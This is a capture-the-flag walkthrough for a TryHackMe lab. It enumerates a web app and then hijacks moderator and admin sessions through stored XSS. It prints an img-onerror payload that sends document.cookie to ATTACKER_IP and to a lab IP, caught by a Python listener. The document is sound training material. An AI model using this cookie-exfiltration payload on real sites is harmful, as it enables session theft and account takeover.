## THM CTF - Whats Your Name?

Flags:

> What is the flag value after accessing the moderator account?

> What is the flag value after accessing the admin panel?

---

We can start changing local DNS to easily handle all the process.
```
sudo nano /etc/hosts
```
Add the record:
```
xxx.xxx.xxx.xxx	   worldwap.thm
```
***It’s important to note that if we’re unable to navigate the site correctly, we can always use the IP address as a backup.*** 

Now we can proceed with an ```Nmap``` scan.
```
sudo nmap -sS -T4 worldwap.thm -p-
```
We discovered three open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 worldwap.thm -p22,80,8081 -sV
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Nothing interesting for now.

We can visit both ```HTTP``` ports with ```Firefox```.

On ```port 80``` we can find a normal site ready to be enumerated, on ```port 8081``` the server respond with a blank page.

<details><summary><h4>Some not so useful site enumeration (click for more)<h4></summary>

We decided to start from ```port 80```.

We can register for the service using some fake data, but after completing the process and attempting to log in, the server responds with an error message.
```
User not verified
```
We attempted to add the following page to the hosts file:
```
login.worldwap.thm
```
However, this attempt was unsuccessful, as the page sent by the server was empty because it's redirecting to:
```
worldwap.thm:8081
```
We try to investigate the source of the message, finding a ```js``` file:
```
http://worldwap.thm/public/js/login.js
```
Analysing it, we discover an ```API```:
```
http://worldwap.thm/api/login.php
```
which respond to us with:
```
"Invalid Request Method"
```
We found another ```API``` analysing the registration process:
```
http://worldwap.thm/api/register.php
```
It responds:
```
"Registration disabled at the moment."
```

</details>

Just to be more precise, we proceed with a Gobuster directory analysis.

<details><summary><h4>Port 80 (click for more)</h4></summary>
  
```
gobuster dir -u http://worldwap.thm -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```

Findings:
```
/api                  (Status: 301) [Size: 310] [--> http://worldwap.thm/api/]
/index.php            (Status: 302) [Size: 0] [--> /public/html/]
/index.php            (Status: 302) [Size: 0] [--> /public/html/]
/javascript           (Status: 301) [Size: 317] [--> http://worldwap.thm/javascript/]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://worldwap.thm/phpmyadmin/]
/public               (Status: 301) [Size: 313] [--> http://worldwap.thm/public/]
```

* ```logs.txt``` is empty, but in the page code we can see something interesting that might be of use:
```
<link rel="stylesheet" href="resource://content-accessible/plaintext.css">
```
We can suppose that this site supports ```null Origin CORS``` configuration.

</details>

<details><summary><h4>Port 8081 (click for more)</h4></summary>
  
```
gobuster dir -u http://worldwap.thm:8081 -w /usr/share/wordlists/dirb/common.txt -x html,js,txt,php,db,json,log
```
Findings:
```
/assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
/block.php            (Status: 200) [Size: 15]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 70]
/index.php            (Status: 200) [Size: 70]
/javascript           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/javascript/]
/login.php            (Status: 200) [Size: 3108]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/phpmyadmin/]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
```
```
* block.php - the message "Reset Completed" appears.
* login.php and change_password.php are interesting.
* logs.txt same as port 80
* setup.php seems to activate a DB creation/reset procedure.
```

</details>

---

Let's go back to ```Firefox``` trying to better understand how the registration works.

As usual we miss an important and obvious detail in the registration page.
```
You can now pre-register! Your details will be reviewed by the site moderator.
```
We could attempt a ```stored Cross-Site Scripting (XSS)``` attack to obtain moderator ```cookies```.

We can use a payload like this one.
```html
<img src=1 onerror="fetch('http://ATTACKER_IP:1234?s='+encodeURIComponent(document.cookie));">
```
and a listener on our machine.
```
python3 -m http.server 1234
```
However the payload is too long for the username, but not for email and name fields.

We can test it in the console receiving some feedback about the ```Cross-Origin Request``` control, maybe it's not working like this.
Anyhow we received our ```cookie``` on the attack machine listening... so it's a win.

After some browsing, our python server received a new ```cookie```... inputting it in the browser and navigating to:
```
worldwap.thm:8081/login.php
```
We're in! And the ```first flag``` is ours.

Now we need to access the ```admin panel```.

In the Moderator dashboard there is nothing to play with except for the ```Go To Chat``` button.
Navitating to the chat we discover that ```block.php``` and ```setup.php``` are used to restart and reset the chat with...
Admin!

Maybe we might be able to obtain session ```cookie``` from the admin too.
Let's try with the same script we used before.
```html
<img src=1 onerror="fetch('http://10.11.123.90:1234?s='+encodeURIComponent(document.cookie));">
```
And it works! We obtained the admin ```cookie``` and now we are able to enter as an admin into the dashboard retrieving the ```second flag```.


### Lessons learned:
* Not only are the technical aspects important, but we also need to read the entire text to fully comprehend the fault logic behind the target machine’s security.
* Always check every script twice, especially when we are attempting a blind attack.
* Add to ```Gobuster``` search the ```Python``` extension.
